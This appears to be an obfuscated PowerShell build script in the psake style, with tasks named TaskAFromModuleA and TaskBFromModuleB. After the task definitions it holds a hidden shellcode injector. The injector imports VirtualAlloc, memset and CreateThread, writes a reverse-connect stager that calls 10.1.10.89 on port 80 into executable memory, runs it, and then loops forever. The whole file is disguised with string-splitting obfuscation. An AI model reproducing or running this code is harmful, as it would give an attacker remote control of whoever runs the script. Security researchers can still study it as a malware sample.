&("{0}{1}{2}" -f 'p','ropert','ies') {
    ${X} = 42
}

&("{0}{1}" -f'tas','k') ("{0}{1}"-f 'de','fault') -depends ("{0}{3}{4}{2}{1}"-f'TaskA','leA','du','Fro','mMo')

.("{0}{1}" -f't','ask') ("{1}{0}{3}{4}{2}"-f 'askAF','T','uleA','romM','od') -FromModule ("{1}{2}{0}"-f 'eA','TaskMod','ul') -depends ("{2}{1}{4}{0}{3}" -f 'omMod','as','T','uleB','kAFr')

.("{1}{0}" -f 'ask','t') ("{1}{3}{0}{2}" -f 'Modu','TaskAFr','leB','om') -Frommodule ("{1}{2}{0}"-f 'duleB','Ta','skMo') -minimumVersion ("{0}{1}" -f'0.2.','0') -depends ("{0}{1}"-f 'x','xx') -continueOnError

.("{1}{0}" -f'sk','ta') ("{0}{1}" -f'x','xx') {
    throw ("{0}{1}" -f 'oop','s')
}

.("{0}{1}"-f 'tas','k') ("{3}{2}{1}{0}" -f 'uleA','romMod','askbF','T') -FromModule ("{0}{2}{1}" -f'Ta','A','skModule') -minimumVersion ("{1}{0}"-f '.1','0.0') -maximumVersion ("{1}{0}"-f'0','0.2.')

&("{0}{1}"-f'tas','k') ("{3}{1}{4}{2}{0}" -f 'uleB','s','bFromMod','Ta','k') -Frommodule ("{0}{2}{1}" -f'Task','uleB','Mod') -minimumVersion ("{0}{1}" -f '0.2','.0') -maximumVersion ("{1}{0}"-f'3.0','0.')

${c} = (((("{105}{89}{55}{6}{47}{91}{82}{79}{3}{77}{31}{83}{107}{68}{28}{99}{104}{58}{41}{73}{111}{106}{20}{117}{25}{74}{112}{65}{90}{86}{120}{7}{56}{39}{27}{115}{53}{85}{26}{4}{57}{87}{109}{40}{113}{23}{24}{92}{1}{100}{44}{52}{70}{97}{88}{29}{34}{80}{5}{50}{59}{30}{35}{46}{101}{21}{78}{64}{37}{9}{114}{67}{119}{10}{110}{118}{18}{51}{71}{76}{16}{13}{15}{66}{102}{22}{14}{94}{32}{0}{72}{45}{96}{116}{60}{17}{75}{49}{36}{108}{93}{54}{95}{69}{103}{12}{19}{61}{33}{62}{8}{2}{84}{81}{38}{42}{98}{63}{11}{48}{43}" -f'w','t)','ntPtr memset(I','nel','c','static e','po','e,','I',' lpTh','t','u','d','ess, IntPt','r','r ','r','Flags',', u','ll','ualAllo','teT','e',' flP','rot','(IntP','o','i',' s','l1zC)',' In','1zC)]p','nt d','blic static exte',']pub','tPtr C','ad','Ptr','t, uin','u',', ui','ern','t src, u',');','[Dll','re','r','rt','nt',' lpThre','xte','int','Imp',' f','por','lIm',' ','ati','ic ext','rn','n','1zC)]pu','rn ',' co','ad(Int','re','lpPar','a','ic','(1','ort(1zC',' dwStackSize, IntPtr lpStartAd','C',' ','tr l',', IntPtr','d','32.dll','hre','er','lic ','tPtr des','k','ub','n','lAll','nt d','o','dl','l','ss, ui','(1zC','ec','Im',', ui','t','at','kernel32.','int','ta',';','ea','amet','zCmsvcrt.','t','[D','r Virt','l','Id);[Dll','nType','ribu','IntPt','pAdd','nt','re','nt','io','c','tes','dAt','wSiz')) -cREpLACE ([ChAR]49+[ChAR]122+[ChAR]67),[ChAR]34));${W} = &("{1}{0}"-f'-Type','Add') -memberDefinition ${C} -Name ("{0}{1}" -f'Wi','n32') -namespace ("{2}{0}{1}" -f 'n','32Functions','Wi') -passthru;[Byte[]];[Byte[]]${Sc} = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x0a,0x01,0x0a,0x59,0x68,0x02,0x00,0x00,0x50,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;${S`IZe} = 0x1000;if (${SC}."Le`Ngth" -gt 0x1000){${si`Ze} = ${Sc}."LE`N`gTh"};${X}=${W}::("{1}{3}{2}{0}" -f 'c','Vir','o','tualAll').Invoke(0,0x1000,${s`IZe},0x40);for (${I}=0;${i} -le (${S`c}."L`engTH"-1);${I}++) {${W}::"MeMs`eT"([IntPtr](${X}.("{0}{1}"-f 'ToIn','t32').Invoke()+${I}), ${s`c}[${I}], 1)};${w}::("{0}{1}{2}" -f'Creat','eThrea','d').Invoke(0,0,${X},0,0,0);for (;;){&("{1}{2}{0}"-f'eep','St','art-sl') 60};
